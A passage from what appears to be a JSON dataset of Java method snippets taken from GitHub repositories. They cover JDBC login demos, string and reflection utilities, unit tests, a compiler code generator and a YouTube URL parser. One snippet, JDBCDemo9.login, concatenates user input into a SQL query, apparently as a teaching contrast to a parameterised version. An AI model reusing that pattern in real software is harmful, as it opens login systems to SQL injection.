sc.nextLine();\n        System.out.println(\"\u8bf7\u8f93\u5165\u5bc6\u7801\uff1a\");\n        String password = sc.nextLine();\n        //2\u3001\u8c03\u7528\u65b9\u6cd5\n        boolean flag = new JDBCDemo9().login2(username, password);\n        if(flag){\n            System.out.println(\"\u767b\u5f55\u6210\u529f\uff01\");\n        } else {\n            System.out.println(\"\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\uff01\");\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/Demo/JDBCDemo9.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33406, "method_name": "login", "class_name": "JDBCDemo9", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean login(String username, String password){\n\n        Connection conn = null;\n        Statement stmt = null;\n        ResultSet rs = null;\n\n        try {\n            //1\u3001\u83b7\u53d6\u8fde\u63a5\n            conn = JDBCUtils.getConnection();\n            //2\u3001\u5b9a\u4e49sql\n            String sql = \"select * from user where username = '\" + username + \"' and password = '\" + password + \"'\";\n            //\u83b7\u53d6\u6267\u884csql\u7684\u5bf9\u8c61\n            stmt = conn.createStatement();\n            //4\u3001\u6267\u884c\u67e5\u8be2\n            rs = stmt.executeQuery(sql);\n            //5\u3001\u5224\u65ad\n//            if(rs.next()){\n//                return true;\n//            } else {\n//                return false;\n//            }\n            System.out.println(sql);\n\n            return rs.next();//\u5982\u679c\u6709\u4e0b\u4e00\u884c\uff0c\u5219\u8fd4\u56detrue\n\n        } catch (SQLException throwables) {\n            throwables.printStackTrace();\n        }finally {\n            JDBCUtils.close(rs, stmt, conn);\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/Demo/JDBCDemo9.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33407, "method_name": "login2", "class_name": "JDBCDemo9", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean login2(String username, String password){\n\n        Connection conn = null;\n        PreparedStatement pstmt = null;\n        ResultSet rs = null;\n\n        try {\n            //1\u3001\u83b7\u53d6\u8fde\u63a5\n            conn = JDBCUtils.getConnection();\n            //2\u3001\u5b9a\u4e49sql\n            String sql = \"select * from user where username = ? and password = ?\";\n            //\u83b7\u53d6\u6267\u884csql\u7684\u5bf9\u8c61\n            pstmt = conn.prepareStatement(sql);\n            //\u7ed9\uff1f\u8d4b\u503c\n            pstmt.setString(1, username);\n            pstmt.setString(2, password);\n            //4\u3001\u6267\u884c\u67e5\u8be2\n            rs = pstmt.executeQuery();\n            //5\u3001\u5224\u65ad\n//            if(rs.next()){\n//                return true;\n//            } else {\n//                return false;\n//            }\n            System.out.println(sql);\n\n            return rs.next();//\u5982\u679c\u6709\u4e0b\u4e00\u884c\uff0c\u5219\u8fd4\u56detrue\n\n        } catch (SQLException throwables) {\n            throwables.printStackTrace();\n        }finally {\n            JDBCUtils.close(rs, pstmt, conn);\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/Demo/JDBCDemo9.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33408, "method_name": "convert", "class_name": "ProcessIdClassicConverter", "params": ["ILoggingEvent"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String convert(ILoggingEvent iLoggingEvent) {\n    return SystemInfoUtils.getPid();\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/ansi/logback/ProcessIdClassicConverter.java", "stars": "3", "class_props": {"extends": "ClassicConverter", "implements": null, "modifiers": ["public"]}}, {"id": 33409, "method_name": "testParseFileContentReturnTypeIsArrayList", "class_name": "LibraryFileLoaderBasicTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testParseFileContentReturnTypeIsArrayList() {\n        List<BookEntry> bookData = testFileLoader.parseFileContent();\n        assertNotNull(\"Resulting book collection is not expected to be null.\", bookData);\n        assertTrue(\"Returned type for book collection is expected to be an ArrayList.\", bookData instanceof ArrayList);\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderBasicTest.java", "stars": "6", "class_props": {"extends": "LibraryFileLoaderTest", "implements": null, "modifiers": ["public"]}}, {"id": 33410, "method_name": "testParseFileContentResult", "class_name": "LibraryFileLoaderBasicTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testParseFileContentResult() {\n        List<Object[]> expectedValues = new ArrayList<>();\n        expectedValues.add(BOOK_SAMPLE1_VALUES);\n        expectedValues.add(BOOK_SAMPLE2_VALUES);\n\n        checkBookCollectionResult(testBookData, expectedValues);\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderBasicTest.java", "stars": "6", "class_props": {"extends": "LibraryFileLoaderTest", "implements": null, "modifiers": ["public"]}}, {"id": 33411, "method_name": "testParseFileContentNoContentLoadedConsoleOutput", "class_name": "LibraryFileLoaderBasicTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testParseFileContentNoContentLoadedConsoleOutput() {\n        testFileLoader = new LibraryFileLoader();\n        String expected = \"ERROR: No content loaded before parsing.\";\n\n        StdStreamIntercept intercept = new StdStreamIntercept();\n\n        intercept.stdCaptureStart();\n        try {\n            try {\n                testFileLoader.parseFileContent();\n            } catch (Exception e) {\n                System.err.println(\"ERROR: executing parseFileContent for console output check:\" + e);\n            }\n            // ignore leading and trailing white spaces\n            assertEquals(\"Console output not as expected in parseFileContent.\", expected.replaceAll(\"\\r\", \"\").trim(),\n                    intercept.getCapturedStdErr().replaceAll(\"\\r\", \"\").trim());\n        } finally {\n            intercept.stdCaptureStop();\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderBasicTest.java", "stars": "6", "class_props": {"extends": "LibraryFileLoaderTest", "implements": null, "modifiers": ["public"]}}, {"id": 33412, "method_name": "main", "class_name": "Demo01GetThreadName", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efaThread\u7c7b\u7684\u5b50\u7c7b\u5bf9\u8c61\n        MyThread mt = new MyThread();\n        //\u8c03\u7528start\u65b9\u6cd5,\u5f00\u542f\u65b0\u7ebf\u7a0b,\u6267\u884crun\u65b9\u6cd5\n        mt.start();\n\n        new MyThread().start();\n        new MyThread().start();\n\n        //\u94fe\u5f0f\u7f16\u7a0b\n        System.out.println(Thread.currentThread().getName());\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/code/06_Thread/src/com/itheima/demo01/getName/Demo01GetThreadName.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33413, "method_name": "stringify", "class_name": "StrUtil", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String stringify(long byteNumber) {\n        if (byteNumber / TB_IN_BYTES > 0) {\n            return df.format((double) byteNumber / (double) TB_IN_BYTES) + \"TB\";\n        } else if (byteNumber / GB_IN_BYTES > 0) {\n            return df.format((double) byteNumber / (double) GB_IN_BYTES) + \"GB\";\n        } else if (byteNumber / MB_IN_BYTES > 0) {\n            return df.format((double) byteNumber / (double) MB_IN_BYTES) + \"MB\";\n        } else if (byteNumber / KB_IN_BYTES > 0) {\n            return df.format((double) byteNumber / (double) KB_IN_BYTES) + \"KB\";\n        } else {\n            return String.valueOf(byteNumber) + \"B\";\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/util/StrUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33414, "method_name": "replaceVariable", "class_name": "StrUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String replaceVariable(final String param) {\n        Map<String, String> mapping = new HashMap<String, String>();\n\n        Matcher matcher = VARIABLE_PATTERN.matcher(param);\n        while (matcher.find()) {\n            String variable = matcher.group(2);\n            String value = System.getProperty(variable);\n            if (StringUtils.isBlank(value)) {\n                value = matcher.group();\n            }\n            mapping.put(matcher.group(), value);\n        }\n\n        String retString = param;\n        for (final String key : mapping.keySet()) {\n            retString = retString.replace(key, mapping.get(key));\n        }\n\n        return retString;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/util/StrUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33415, "method_name": "compressMiddle", "class_name": "StrUtil", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String compressMiddle(String s, int headLength, int tailLength) {\n        Validate.notNull(s, \"Input string must not be null\");\n        Validate.isTrue(headLength > 0, \"Head length must be larger than 0\");\n        Validate.isTrue(tailLength > 0, \"Tail length must be larger than 0\");\n\n        if (headLength + tailLength >= s.length()) {\n            return s;\n        }\n        return s.substring(0, headLength) + \"...\" + s.substring(s.length() - tailLength);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/util/StrUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33416, "method_name": "main", "class_name": "DemoBaozi", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        Baozi baozi = new Baozi();\n\n        new BaoziPu(baozi).start();\n\n        new Chihuo(baozi).start();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Baozi/DemoBaozi.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33417, "method_name": "executeProcedure", "class_name": "OrangeAmaranthExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure OrangeAmaranthExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure OrangeAmaranthExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure OrangeAmaranthExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure OrangeAmaranthExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(OrangeAmaranthBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/OrangeAmaranthExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33418, "method_name": "generateCode", "class_name": "StmFOR", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result = \"\";\n\t\tresult += super.generateCode();\n\n\t\tString var_test = \"_var_for_test__\" + this.getId();\n\t\tString label_for_test = \"_for_label_test_\" + this.getId();\n\t\tString label_for_code = \"_for_label_code_\" + this.getId(); \n\t\tString label_for_end = \"_for_label_end_\" + this.getId(); \n\t\t\n\t\tresult += tab() + getFirst().generateCode() + NL; //initialization\n\t\tresult += tab() + \"int \" + var_test + \";\" + NL;\n\t\t\n\t\tresult += tab() + label_for_test + \":{}\" + NL;\n\t\t\n\t\tresult += tab() + var_test + \" = \" + expr.generateCode() + \";\" + NL;\n\t\t\n\t\tresult += tab() + \"if (\" + var_test + \")\" + NL; //stopping condition\n\t\tincIndent();\n\t\t\tresult += tab() + \"goto \" + label_for_code + \";\" + NL;\n\t\tdecIndent();\n\t\tresult += tab() + \"goto \" + label_for_end + \";\" + NL;\n\t\tresult += tab() + label_for_code + \":{\" + NL;\n\t\tincIndent();\n\t\t\tresult += getThird().generateCode();\n\t\t\tresult += getSecond().generateCode(); //increment\n\t\t\tresult += tab() + \"goto \" + label_for_test + \";\" + NL;\n\t\tdecIndent();\n\t\tresult += tab() + \"}\" + NL;\n\t\tresult += tab() + label_for_end + \":{}\" + NL;\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmFOR.java", "stars": "3", "class_props": {"extends": "StmTernary", "implements": null, "modifiers": ["public"]}}, {"id": 33419, "method_name": "checkType", "class_name": "StmFOR", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\texpr.checkType();\n\t\tif (this.getFirst() != null)\n\t\t\tthis.getFirst().checkType();\n\t\tif (this.getSecond() != null)\n\t\t\tthis.getSecond().checkType();\n\t\tif (this.getThird() != null)\n\t\t\tthis.getThird().checkType();\n\t\texpr.getType().assertType(this, TypeCode.BOOLEAN);\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmFOR.java", "stars": "3", "class_props": {"extends": "StmTernary", "implements": null, "modifiers": ["public"]}}, {"id": 33420, "method_name": "toString", "class_name": "StmFOR", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"for (... ; ... ; ...)\";\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmFOR.java", "stars": "3", "class_props": {"extends": "StmTernary", "implements": null, "modifiers": ["public"]}}, {"id": 33421, "method_name": "getSupportedFallbackId", "class_name": "YouTubeManager", "params": ["int"], "throws": null, "modifiers": ["private", "static"], "return_type": "int", "snippet": "    private static int getSupportedFallbackId(int oldId) {\n        final int supportedFormatIds[] = {13,  //3GPP (MPEG-4 encoded) Low quality\n                17,  //3GPP (MPEG-4 encoded) Medium quality\n                18,  //MP4  (H.264 encoded) Normal quality\n                22,  //MP4  (H.264 encoded) High quality\n                37   //MP4  (H.264 encoded) High quality\n        };\n        int fallbackId = oldId;\n        for (int i = supportedFormatIds.length - 1; i >= 0; i--) {\n            if (oldId == supportedFormatIds[i] && i > 0) {\n                fallbackId = supportedFormatIds[i - 1];\n            }\n        }\n        return fallbackId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/youtube/YouTubeManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33422, "method_name": "isYouTubeUrl", "class_name": "YouTubeManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isYouTubeUrl(String youtubeUrl) {\n        String expression = \"^.*((youtu.be\\\\/)|(v\\\\/)|(\\\\/u\\\\/w\\\\/)|(embed\\\\/)|(watch\\\\?))\\\\??v?=?([^#\\\\&\\\\?]*).*\"; // var regExp = /^.*((youtu.be\\/)|(v\\/)|(\\/u\\/\\w\\/)|(embed\\/)|(watch\\?))\\??v?=?([^#\\&\\?]*).*/;\n        Pattern pattern = Pattern.compile(expression, Pattern.CASE_INSENSITIVE);\n        Matcher matcher = pattern.matcher(youtubeUrl);\n        return matcher.matches();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/youtube/YouTubeManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33423, "method_name": "getYouTubeVideoId", "class_name": "YouTubeManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getYouTubeVideoId(String youtubeUrl) {\n        String videoId = \"\";\n        if (youtubeUrl != null && youtubeUrl.trim().length() > 0 && youtubeUrl.startsWith(\"http\")) {\n            String expression = \"^.*((youtu.be\\\\/)|(v\\\\/)|(\\\\/u\\\\/w\\\\/)|(embed\\\\/)|(watch\\\\?))\\\\??v?=?([^#\\\\&\\\\?]*).*\"; // var regExp = /^.*((youtu.be\\/)|(v\\/)|(\\/u\\/\\w\\/)|(embed\\/)|(watch\\?))\\??v?=?([^#\\&\\?]*).*/;\n            Pattern pattern = Pattern.compile(expression, Pattern.CASE_INSENSITIVE);\n            Matcher matcher = pattern.matcher(youtubeUrl);\n            if (matcher.matches()) {\n                String groupIndex1 = matcher.group(7);\n                if (groupIndex1 != null && groupIndex1.length() == 11)\n                    videoId = groupIndex1;\n            }\n        }\n        return videoId;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/youtube/YouTubeManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33424, "method_name": "calculateYouTubeUrl", "class_name": "YouTubeManager", "params": ["String", "boolean", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String calculateYouTubeUrl(String quality, boolean fallback, String videoId) throws IOException {\n\n        String uriStr = null;\n\n        Request.Builder request = new Request.Builder();\n        request.url(YOUTUBE_VIDEO_INFORMATION_URL + videoId);\n        Call call = client.newCall(request.build());\n        Response response = call.execute();\n        if (!response.isSuccessful())\n            return null;\n\n        String infoStr = response.body().string();\n\n        String[] args = infoStr.split(\"&\");\n        Map<String, String> argMap = new HashMap<>();\n        for (String arg : args) {\n            String[] valStrArr = arg.split(\"=\");\n            if (valStrArr.length >= 2) {\n                argMap.put(valStrArr[0], URLDecoder.decode(valStrArr[1]));\n            }\n        }\n\n        //Find out the URI string from the parameters\n\n        //Populate the list of formats for the video\n        String fmtList = URLDecoder.decode(argMap.get(\"fmt_list\"), \"utf-8\");\n        ArrayList<Format> formats = new ArrayList<>();\n        if (null != fmtList) {\n            String formatStrs[] = fmtList.split(\",\");\n\n            for (String lFormatStr : formatStrs) {\n                Format format = new Format(lFormatStr);\n                formats.add(format);\n            }\n        }\n\n        //Populate the list of streams for the video\n        String streamList = argMap.get(\"url_encoded_fmt_stream_map\");\n        if (null != streamList) {\n            String streamStrs[] = streamList.split(\",\");\n            ArrayList<VideoStream> streams = new ArrayList<>();\n            for (String streamStr : streamStrs) {\n                VideoStream lStream = new VideoStream(streamStr);\n                streams.add(lStream);\n            }\n\n            //Search for the given format in the list of video formats\n            // if it is there, select the corresponding stream\n            // otherwise if fallback is requested, check for next lower format\n            int formatId = Integer.parseInt(quality);\n\n            Format searchFormat = new Format(formatId);\n            while (!formats.contains(searchFormat) && fallback) {\n                int oldId = searchFormat.getId();\n                int newId = getSupportedFallbackId(oldId);\n\n                if (oldId == newId) {\n                    break;\n                }\n                searchFormat = new Format(newId);\n            }\n\n            int index = formats.indexOf(searchFormat);\n            if (index >= 0) {\n                VideoStream searchStream = streams.get(index);\n                uriStr = searchStream.getUrl();\n            }\n\n        }\n        //Return the URI string. It may be null if the format (or a fallback format if enabled)\n        // is not found in the list of formats for the video\n        return uriStr;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/youtube/YouTubeManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33425, "method_name": "getIpTest", "class_name": "IpUtilTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getIpTest() {\n        String machineIp = IpUtil.getMachineIp();\n        System.out.println(machineIp);\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/test/java/cn/tsxygfy/beyond/IpUtilTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33426, "method_name": "isList", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isList(Object obj) {\n        if (obj == null) return false;\n\n        Class<?> type = obj.getClass();\n\n        return obj instanceof List || type.isArray();\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33427, "method_name": "isMap", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isMap(Object obj) {\n        if (obj == null) return false;\n\n        return obj instanceof Map;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33428, "method_name": "isDateTime", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isDateTime(Object obj) {\n        return obj instanceof TemporalAccessor;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33429, "method_name": "isWrapper", "class_name": "ReflectUtil", "params": ["Class<?>"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isWrapper(Class<?> type) {\n        return type == Integer.class || type == Long.class || type == Boolean.class\n                || type == Double.class || type == Float.class\n                || type == Character.class || type == Byte.class\n                || type == Short.class;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33430, "method_name": "isNotJSONObject", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isNotJSONObject(Object val) {\n        if (val == null) return true;\n\n        Class<?> type = val.getClass();\n        return type.isPrimitive() || isWrapper(type) || type == String.class;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33431, "method_name": "isJSONObject", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isJSONObject(Object val) {\n        return !isNotJSONObject(val);\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33432, "method_name": "objectToMap", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<String,Object>", "snippet": "    public static Map<String, Object> objectToMap(@NotNull Object obj) {\n        Map<String, Object> map = new HashMap<>();\n\n        Field[] fields = obj.getClass().getDeclaredFields();\n\n        try {\n            for (Field field : fields) {\n                int mod = field.getModifiers();\n                if (Modifier.isStatic(mod) || Modifier.isFinal(mod) || Modifier.isTransient(mod)) {\n                    continue;\n                }\n\n                // \u83b7\u53d6Transient\u6ce8\u89e3\n                if (field.getAnnotation(Transient.class) != null) {\n                    continue;\n                }\n\n                boolean accessible = field.isAccessible();\n                field.setAccessible(true);\n\n                String key = field.getName();\n                Object val = field.get(obj);\n\n                // \u5904\u7406\u65f6\u95f4\u7c7b\u578b\n                if (isDateTime(val)) {\n                    TimeFormat timeFormat = field.getAnnotation(TimeFormat.class);\n                    if (timeFormat == null) {\n                        map.put(key, val);\n                    } else {\n                        String pattern  = timeFormat.value();\n\n                        if (\"\".equals(pattern)) {\n                            map.put(key, StringUtil.dateTimeToString((TemporalAccessor) val));\n                        } else {\n                            map.put(key, StringUtil.dateTimeToString((TemporalAccessor) val, pattern));\n                        }\n                    }\n                }\n                // \u76f4\u63a5\u5b58\u653e\u81f3Map\n                else {\n                    map.put(key, val);\n                }\n\n                field.setAccessible(accessible);\n            }\n        } catch (IllegalAccessException e) {\n            throw new RuntimeException(e);\n        }\n\n        return map;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33433, "method_name": "asList", "class_name": "ReflectUtil", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<?>", "snippet": "    public static List<?> asList(Object obj) {\n        if (obj instanceof List) return (List<?>) obj;\n\n        if (obj.getClass().isArray()) {\n            Class<?> type = obj.getClass().getComponentType();\n            if (!type.isPrimitive()) {\n                return Arrays.asList((Object[]) obj);\n            }\n\n            if (type == int.class) {\n                return Arrays.stream((int[]) obj).boxed().collect(Collectors.toList());\n            }\n\n            if (type == boolean.class) {\n                boolean[] booleans = (boolean[]) obj;\n                return IntStream.range(0, booleans.length)\n                        .mapToObj(idx -> booleans[idx])\n                        .collect(Collectors.toList());\n            }\n\n            if (type == double.class) {\n                return Arrays.stream((double[]) obj).boxed().collect(Collectors.toList());\n            }\n\n            if (type == float.class) {\n                float[] floats = (float[]) obj;\n                return IntStream.range(0, floats.length)\n                        .mapToObj(idx -> floats[idx])\n                        .collect(Collectors.toList());\n            }\n\n            if (type == long.class) {\n                return Arrays.stream((long[]) obj).boxed().collect(Collectors.toList());\n            }\n\n            if (type == char.class) {\n                char[] chars = (char[]) obj;\n                return IntStream.range(0, chars.length)\n                        .mapToObj(idx -> chars[idx])\n                        .collect(Collectors.toList());\n            }\n\n            if (type == byte.class) {\n                byte[] bytes = (byte[]) obj;\n                return IntStream.range(0, bytes.length)\n                        .mapToObj(idx -> bytes[idx])\n                        .collect(Collectors.toList());\n            }\n\n            if (type == short.class) {\n                short[] shorts = (short[]) obj;\n                return IntStream.range(0, shorts.length)\n                        .mapToObj(idx -> shorts[idx])\n                        .collect(Collectors.toList());\n            }\n        }\n\n        return Collections.singletonList(obj);\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/ReflectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33434, "method_name": "onCreate", "class_name": "EntityTimestamp", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate()\n    {\n        timestampUpdated = timestampCreated = new Date();\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/database/abstracts/EntityTimestamp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33435, "method_name": "onUpdate", "class_name": "EntityTimestamp", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onUpdate()\n    {\n        timestampUpdated = new Date();\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/database/abstracts/EntityTimestamp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33436, "method_name": "getTimestampCreated", "class_name": "EntityTimestamp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getTimestampCreated() {\n        return this.timestampCreated;\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/database/abstracts/EntityTimestamp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33437, "method_name": "getTimestampUpdated", "class_name": "EntityTimestamp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getTimestampUpdated() {\n        return this.timestampUpdated;\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/database/abstracts/EntityTimestamp.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33438, "method_name": "sendSimpleMessage", "class_name": "SampleActiveMqTests", "params": ["CapturedOutput"], "throws": ["InterruptedException"], "modifiers": [], "return_type": "void", "snippet": "\tvoid sendSimpleMessage(CapturedOutput output) throws InterruptedException {\n\t\tthis.producer.send(\"Test 